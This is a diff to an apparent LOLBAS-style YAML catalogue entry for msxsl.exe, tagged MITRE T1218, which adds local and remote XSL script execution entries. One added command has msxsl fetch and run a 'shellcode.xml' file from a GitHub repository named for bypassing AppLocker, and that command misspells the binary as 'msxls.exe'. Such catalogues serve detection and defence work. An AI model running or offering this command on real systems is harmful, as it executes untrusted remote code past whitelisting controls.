@@ -7,7 +7,23 @@ Commands:
   - Command: msxsl.exe customers.xml script.xsl
     Description: Run COM Scriptlet code within the script.xsl file (local).
     Usecase: Local execution of script stored in XSL file.
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows
+  - Command: msxsl.exe customers.xml script.xsl
+    Description: Run COM Scriptlet code within the script.xsl file (local).
+    Usecase: Local execution of script stored in XSL file.
     Category: AWL Bypass
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows
+  - Command: msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
+    Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
+    Usecase: Local execution of remote script stored in XSL script stored as an XML file.
+    Category: Execute
     Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
